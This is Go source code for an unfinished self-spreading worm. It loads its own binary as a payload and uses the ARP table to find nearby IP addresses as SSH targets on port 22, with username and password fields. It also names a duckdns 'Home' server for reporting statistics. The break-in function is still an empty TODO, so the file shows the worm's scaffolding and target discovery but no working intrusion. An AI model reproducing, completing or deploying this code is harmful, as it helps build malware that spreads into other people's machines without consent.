package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"regexp"

	"os"
	"os/exec"

	"golang.org/x/crypto/ssh"
)

// Version is the version of this worm
var Version = "0.1.0"

// Payload is a copy of the the binary compiled from this file
var Payload []byte

// Targets is an array of Target structs
var Targets []Target

// Home is the URL of the server to report statistics to
var Home = "mweya.duckdns.org"

// DebugMode is our global debug flag. If this is true, debug information will be shown.
var DebugMode = false

// The regular expression rule used to find IP addresses
var ipSyntax = regexp.MustCompile(`([0-9]{1,3}[\.]){3}[0-9]{1,3}`)

// Connection is a wrapper around the SSH client gotten from the Connect method for easier access
type Connection struct {
	*ssh.Client
}

// Target represents a machine to be attacked. This can be marshalled to JSON for stats' sake.
type Target struct {
	IP       string `json:"ip"`
	Username string `json:"username"`
	Password string `json:"password"`
	Port     string `json:"port"`
}

// DumpDebugInfo dumps information that might help with debugging to the screen
func DumpDebugInfo() {
	fmt.Println("W0RM Debug Info")
	fmt.Println("\nVersion: " + Version)
	fmt.Println("Home: " + Home)
	fmt.Println("Attack List:")
	// Print targets
	var j = 0
	for j < len(Targets) {
		fmt.Println("\tTarget:\n\t\tIP: " + Targets[j].IP + "\n\t\tUsername: " + Targets[j].Username + "\n\t\tPassword: " + Targets[j].Password + "\n\t\tPort: " + Targets[j].Port + "\n")
		j = j + 1
	}

	// Print self
	//fmt.Println("Raw payload: " + string(Payload))
	fmt.Println("")
}

// StartFSM starts our finite state machine
func StartFSM() {
	if DebugMode {
		fmt.Println("[*] Starting FSM")
	}

	for {
		FindTargets()
		TryTargets()
		DumpInfo()
		Panic()
	}
}

// FindTargets attempts to find new machines to infect using ARP resolution
func FindTargets() {
	if DebugMode {
		fmt.Println("[*] Searching for targets")
	}

	// TODO
	//if runtime.GOOS == "linux" || runtime.GOOS == "bsd" || runtime.GOOS == "osx" {
	cmd := exec.Command("arp", "-a")
	s, err := cmd.CombinedOutput()
	if err != nil {
		// TODO
		Panic()
	}
	found := ipSyntax.FindAll(s, -1)
	var j = 0
	tempTarget := Target{
		IP:       "",
		Port:     "22",
		Username: "",
		Password: "",
	}
	for j < len(found) {
		tempTarget.IP = string(found[j])
		Targets = append(Targets, tempTarget)
		j = j + 1
	}

	//}
}

// TryTargets attempts to break into the targets
func TryTargets() {
	if DebugMode {
		fmt.Println("[*] Attempting to break into targets")
	}

	// TODO

}

// DumpInfo is the last method in our FSM that will either dump the state of the program or not before
// calling the first method in our FSM chain
func DumpInfo() {
	if DebugMode {
		DumpDebugInfo()
	}
}

// Panic is a fatal error
func Panic() {
	DumpDebugInfo()
	os.Exit(1)
}

func main() {
	// Move copy of self to RAM
	path, err := os.Executable()
	if err != nil {
		// TODO shit now what
		log.Fatal(err)
		if DebugMode {
			DumpDebugInfo()
		}
		return
	}

	Payload, err = ioutil.ReadFile(path)
	if err != nil {
		// TODO shit now what
		log.Fatal(err)
		if DebugMode {
			DumpDebugInfo()
		}
		return
	}

	if DebugMode {
		fmt.Println("[*] Init completed")
	}
	StartFSM()
}
